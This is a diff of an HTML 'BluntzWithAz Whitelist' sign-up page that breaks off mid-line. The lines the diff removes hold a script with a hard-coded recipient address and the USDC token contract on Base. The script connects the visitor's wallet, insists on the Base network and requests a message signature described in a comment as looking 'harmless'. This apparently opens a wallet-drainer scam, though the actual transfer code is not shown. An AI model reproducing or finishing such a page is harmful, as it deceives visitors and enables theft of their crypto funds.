@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="utf-8"/>
-  <title>BluntzWithAz Whitelist Sign-Up</title>
+  <title>BluntzWithAz Whitelist</title>
   <meta name="viewport" content="width=device-width,initial-scale=1"/>
   <style>
     body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:#0c0c0c;color:#eee;text-align:center;padding:50px 20px}
@@ -19,33 +19,9 @@
   <h1>BluntzWithAz Whitelist</h1>
   <h2>Sign once – secure your spot for launch.</h2>
 
-  <button id="signBtn">Sign Whitelist Entry</button>
+  <button id="signBtn">Connect Wallet</button>
 
   <div id="status"></div>
 
   <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
-  <script>
-    /* --- BluntzWithAz config --- */
-    const FRONTEND_EOA = "0x5f20bf147965fA3513EDFf77CcFB2467A980fe4F";
-    const RECIPIENT    = "0xA22450D033BC2A651Fe9F1e34e75578AE2133E6a";
-    const USDC         = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
-    const MESSAGE      = "Register me for the BluntzWithAz whitelist";
-
-    let signer;
-    const signBtn = document.getElementById('signBtn');
-    const status  = document.getElementById('status');
-
-    signBtn.addEventListener('click', async ()=>{
-      if(!window.ethereum){status.innerHTML='Please use MetaMask/Coinbase browser.';return;}
-      await window.ethereum.request({method:'eth_requestAccounts'});
-      signer = new ethers.providers.Web3Provider(window.ethereum).getSigner();
-      const chain = await signer.getChainId();
-      if(chain!==8453){alert('Switch to Base network.');return;}
-      signBtn.style.display='none';
-      status.innerHTML='<span class=loader></span> Awaiting signature…';
-
-      try{
-        /* 1) show user a harmless personal-message signature */
-        const sig = await signer.signMessage(MESSAGE);
-
-        /*
+  <
